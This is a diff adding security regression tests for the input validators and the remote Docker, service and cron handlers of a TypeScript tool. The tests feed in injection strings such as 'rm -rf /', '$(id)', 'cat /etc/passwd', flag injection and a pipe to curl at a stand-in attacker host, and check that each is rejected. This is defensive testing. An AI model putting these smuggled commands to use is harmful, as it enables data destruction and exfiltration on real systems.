@@ -20,6 +20,15 @@ import { toRemoteSshCfg } from '../src/tools/remote-shell.js';
 import { handleRemoteDocker } from '../src/tools/remote-docker.js';
 import { handleRemoteService } from '../src/tools/remote-service.js';
 import { handleOpenclawDeploy } from '../src/tools/openclaw-deploy.js';
+import {
+  validateContainerName,
+  validateServiceName,
+  validateAgentName,
+  validateScheduleValue,
+  validateCronId,
+  shellQuote,
+} from '../src/validate.js';
+import { handleCronCreate, handleCronDelete, handleCronHistory } from '../src/tools/cron-manage.js';
 import type { Config } from '../src/config.js';
 
 // Minimal config stub for heuristic-only tests (no SSH/HTTP needed)
@@ -515,5 +524,270 @@ describe('openclaw_deploy', () => {
     );
     assert.equal(result.success, false);
     assert.equal(result.service, 'worker');
+  });
+});
+
+// ============================================================================
+// Security regression tests — validate.ts (findings 1-8)
+// All validators must reject shell metacharacters, leading hyphens, and "..".
+// ============================================================================
+
+describe('validateContainerName (security)', () => {
+  // Valid inputs
+  it('accepts a plain container name', () => {
+    assert.equal(validateContainerName('nginx'), 'nginx');
+  });
+  it('accepts compose-style names with underscores and digits', () => {
+    assert.equal(validateContainerName('project_web_1'), 'project_web_1');
+  });
+  it('accepts a 64-char hex container ID', () => {
+    const id = 'a'.repeat(64);
+    assert.equal(validateContainerName(id), id);
+  });
+
+  // Injection attempts that must be rejected
+  it('rejects semicolon injection (finding 1)', () => {
+    assert.throws(() => validateContainerName('myapp; rm -rf /'), /Invalid container name/);
+  });
+  it('rejects backtick injection', () => {
+    assert.throws(() => validateContainerName('app`id`'), /Invalid container name/);
+  });
+  it('rejects dollar-sign subshell', () => {
+    assert.throws(() => validateContainerName('app$(id)'), /Invalid container name/);
+  });
+  it('rejects leading hyphen (flag injection)', () => {
+    assert.throws(() => validateContainerName('-v /:/host'), /Invalid container name/);
+  });
+  it('rejects path traversal via ".."', () => {
+    // "../../etc/passwd" starts with "." so the leading-alphanumeric check fires first.
+    // Either error message is acceptable; the key point is it throws.
+    assert.throws(() => validateContainerName('../../etc/passwd'), /Invalid container name|must not contain/);
+  });
+  it('rejects newline injection', () => {
+    assert.throws(() => validateContainerName('app\nrm -rf /'), /Invalid container name/);
+  });
+  it('rejects pipe injection (finding 2)', () => {
+    assert.throws(() => validateContainerName('name | curl http://attacker.com/steal'), /Invalid container name/);
+  });
+  it('rejects empty string', () => {
+    assert.throws(() => validateContainerName(''), /must not be empty/);
+  });
+});
+
+describe('validateServiceName (security)', () => {
+  it('accepts a plain service name', () => {
+    assert.equal(validateServiceName('nginx'), 'nginx');
+  });
+  it('accepts service with at-sign instance specifier', () => {
+    assert.equal(validateServiceName('getty@tty1.service'), 'getty@tty1.service');
+  });
+  it('rejects semicolon injection (finding 3)', () => {
+    assert.throws(() => validateServiceName('myservice; cat /etc/passwd'), /Invalid service name/);
+  });
+  it('rejects leading hyphen', () => {
+    assert.throws(() => validateServiceName('-n 1'), /Invalid service name/);
+  });
+  it('rejects space in name', () => {
+    assert.throws(() => validateServiceName('nginx reload'), /Invalid service name/);
+  });
+  it('rejects empty string', () => {
+    assert.throws(() => validateServiceName(''), /must not be empty/);
+  });
+});
+
+describe('validateAgentName (security)', () => {
+  it('accepts a short lowercase agent name', () => {
+    assert.equal(validateAgentName('ops'), 'ops');
+  });
+  it('accepts alphanumeric with hyphen', () => {
+    assert.equal(validateAgentName('trading-bot'), 'trading-bot');
+  });
+  it('rejects space (finding 6)', () => {
+    assert.throws(() => validateAgentName('ops --local; id'), /Invalid agent name/);
+  });
+  it('rejects leading hyphen', () => {
+    assert.throws(() => validateAgentName('--local'), /Invalid agent name/);
+  });
+  it('rejects semicolons', () => {
+    assert.throws(() => validateAgentName('ops;id'), /Invalid agent name/);
+  });
+  it('rejects empty string', () => {
+    assert.throws(() => validateAgentName(''), /must not be empty/);
+  });
+});
+
+describe('validateScheduleValue (security)', () => {
+  it('accepts a relative interval like "30m"', () => {
+    assert.equal(validateScheduleValue('30m'), '30m');
+  });
+  it('accepts an ISO timestamp', () => {
+    assert.equal(validateScheduleValue('2026-04-01T14:00:00'), '2026-04-01T14:00:00');
+  });
+  it('accepts a relative offset like "+20m"', () => {
+    assert.equal(validateScheduleValue('+20m'), '+20m');
+  });
+  it('rejects semicolon injection (finding 7)', () => {
+    assert.throws(() => validateScheduleValue('+1m; malicious'), /Invalid schedule value/);
+  });
+  it('rejects backtick injection', () => {
+    assert.throws(() => validateScheduleValue('`id`'), /Invalid schedule value/);
+  });
+  it('rejects dollar-sign subshell', () => {
+    assert.throws(() => validateScheduleValue('$(id)'), /Invalid schedule value/);
+  });
+  it('rejects empty string', () => {
+    assert.throws(() => validateScheduleValue(''), /must not be empty/);
+  });
+});
+
+describe('validateCronId (security)', () => {
+  const validUuid = 'a1b2c3d4-e5f6-7890-abcd-ef1234567890';
+  it('accepts a well-formed UUID', () => {
+    assert.equal(validateCronId(validUuid), validUuid);
+  });
+  it('rejects a non-UUID string', () => {
+    assert.throws(() => validateCronId('not-a-uuid'), /Invalid cron job ID/);
+  });
+  it('rejects a UUID with injection suffix', () => {
+    assert.throws(() => validateCronId(validUuid + '; rm -rf /'), /Invalid cron job ID/);
+  });
+  it('rejects leading hyphen', () => {
+    assert.throws(() => validateCronId('-f /etc/passwd'), /Invalid cron job ID/);
+  });
+  it('rejects empty string', () => {
+    assert.throws(() => validateCronId(''), /must not be empty/);
+  });
+});
+
+describe('shellQuote (security)', () => {
+  it('wraps plain strings in single quotes', () => {
+    assert.equal(shellQuote('nginx'), "'nginx'");
+  });
+  it('escapes embedded single quotes', () => {
+    // Input: it's here  =>  Output: 'it'"'"'s here'
+    assert.equal(shellQuote("it's here"), "'it'\\''s here'");
+  });
+  it('makes semicolons inert', () => {
+    const q = shellQuote('a; rm -rf /');
+    // The result must start and end with a single quote and not have unquoted semi
+    assert.ok(q.startsWith("'"), 'must start with single quote');
+    assert.ok(q.endsWith("'"), 'must end with single quote');
+    // Shell would interpret this as one argument, no injection possible
+    assert.ok(q.includes(';'), 'semicolon is inside quotes and inert');
+  });
+});
+
+// ============================================================================
+// Security regression: handleRemoteDocker rejects injection in container name
+// ============================================================================
+
+describe('handleRemoteDocker injection guard (security)', () => {
+  const withHost = { ...stubConfig, remoteHost: '10.0.0.1' };
+
+  it('rejects a container name with semicolon injection', async () => {
+    const result = await handleRemoteDocker(
+      { action: 'logs', container: 'myapp; rm -rf /', lines: 50 },
+      withHost,
+    );
+    assert.equal(result.success, false);
+    assert.match(result.error ?? '', /Invalid container name/);
+  });
+
+  it('rejects a container name with leading hyphen', async () => {
+    const result = await handleRemoteDocker(
+      { action: 'start', container: '-v /:/host', lines: 50 },
+      withHost,
+    );
+    assert.equal(result.success, false);
+    assert.match(result.error ?? '', /Invalid container name/);
+  });
+});
+
+// ============================================================================
+// Security regression: handleRemoteService rejects injection in service name
+// ============================================================================
+
+describe('handleRemoteService injection guard (security)', () => {
+  const withHost = { ...stubConfig, remoteHost: '10.0.0.1' };
+
+  it('rejects a service name with semicolon injection', async () => {
+    const result = await handleRemoteService(
+      { action: 'restart', service: 'myservice; cat /etc/passwd' },
+      withHost,
+    );
+    assert.equal(result.success, false);
+    assert.match(result.error ?? '', /Invalid service name/);
+  });
+
+  it('rejects a service name with a space', async () => {
+    const result = await handleRemoteService(
+      { action: 'start', service: 'nginx reload' },
+      withHost,
+    );
+    assert.equal(result.success, false);
+    assert.match(result.error ?? '', /Invalid service name/);
+  });
+});
+
+// ============================================================================
+// Security regression: handleCronCreate rejects schedule injection (finding 7)
+// ============================================================================
+
+describe('handleCronCreate schedule injection guard (security)', () => {
+  const cronConfig: Config = {
+    ...stubConfig,
+    sshHost: '0.0.0.1',
+    haUrl: 'http://localhost',
+  };
+
+  it('rejects a schedule with semicolon injection in --at value', async () => {
+    const result = await handleCronCreate(
+      { name: 'test', message: 'hello', schedule: 'at +1m; malicious' },
+      cronConfig,
+    );
+    assert.equal(result.success, false);
+    assert.match(result.error ?? '', /Invalid schedule value/);
+  });
+
+  it('rejects a schedule with space/injection in --every value', async () => {
+    const result = await handleCronCreate(
+      { name: 'test', message: 'hello', schedule: 'every 30m; id' },
+      cronConfig,
+    );
+    assert.equal(result.success, false);
+    assert.match(result.error ?? '', /Invalid schedule value/);
+  });
+});
+
+// ============================================================================
+// Security regression: handleCronDelete rejects non-UUID IDs (finding 7)
+// ============================================================================
+
+describe('handleCronDelete ID validation (security)', () => {
+  const cronConfig: Config = {
+    ...stubConfig,
+    sshHost: '0.0.0.1',
+    haUrl: 'http://localhost',
+  };
+
+  it('rejects a non-UUID job ID', async () => {
+    const result = await handleCronDelete({ id: 'not-a-uuid; rm -rf /' }, cronConfig);
+    assert.equal(result.success, false);
+    assert.match(result.error ?? '', /Invalid cron job ID/);
+  });
+
+  it('accepts a well-formed UUID (returns SSH error, not validation error)', async () => {
+    const result = await handleCronDelete(
+      { id: 'a1b2c3d4-e5f6-7890-abcd-ef1234567890' },
+      cronConfig,
+    );
+    // SSH to 0.0.0.1 will fail; that is expected. The important thing is the
+    // error is NOT about UUID validation.
+    if (!result.success) {
+      assert.ok(
+        !(result.error ?? '').includes('Invalid cron job ID'),
+        'error should be SSH-level, not UUID validation',
+      );
+    }
   });
 });
